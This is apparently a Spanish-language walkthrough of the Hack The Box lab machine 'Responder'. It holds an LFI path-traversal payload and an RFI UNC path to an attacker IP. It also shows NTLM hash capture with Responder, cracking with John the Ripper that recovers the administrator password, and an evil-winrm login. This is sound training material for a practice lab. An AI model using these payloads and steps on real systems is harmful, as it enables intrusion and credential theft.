> [!info] Información de la máquina
> **Plataforma:** Hack The Box
> **Máquina:** Responder
> **OS:** Windows
> **Dificultad:** Very Easy
> **IP objetivo:** `10.129.95.234`
> **IP atacante:** `10.10.14.86` / `10.10.15.208


## WEB ENUMERATION


![Enumeración web de Responder](../../Images/Responder/Pasted%20image%2020261101215436.png)

### Which scripting language is being used on the server to generate webpages?

```zsh
whatweb -v http://unika.htb
WhatWeb report for http://unika.htb
Status    : 200 OK
Title     : Unika
IP        : 10.129.95.234
Country   : RESERVED, ZZ

Summary   : Apache[2.4.52], Bootstrap, Email[info@unika.htb], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], JQuery[1.11.1], OpenSSL[1.1.1m], PHP[8.1.1], Script, X-Powered-By[PHP/8.1.1], X-UA-Compatible[IE=edge]
```

### What is the name of the URL parameter which is used to load different language versions of the webpage?

```http
http://unika.htb/index.php?page=german.html
```

### Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

![Ejemplo de LFI](../../Images/Responder/Pasted%20image%2020261101220106.png)

### Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

```http
//10.10.14.6/somefile
```

### What does NTLM stand for?

```txt
New Technology LAN Manager
```

### Which flag do we use in the Responder utility to specify the network interface?

```bash
-i

sudo reponder -I tun0 -dwv
```

### There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

```txt
John The Ripper
```

### What is the password for the administrator user?

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt test.txt
badminton
```

### We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

```bash
sudo nmap -p- -sSCV --min-rate 5000 -Pn 10.129.95.234 -oN ../nmap/scan_responder.txt
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### On which user's desktop is the flag located?

```bash
evil-winrm -i 10.129.95.234 -u Administrator -p 'badminton'
```

```cmd
*Evil-WinRM* PS C:\users\mike\Desktop> type "C:/users/mike/Desktop/flag.txt"
```
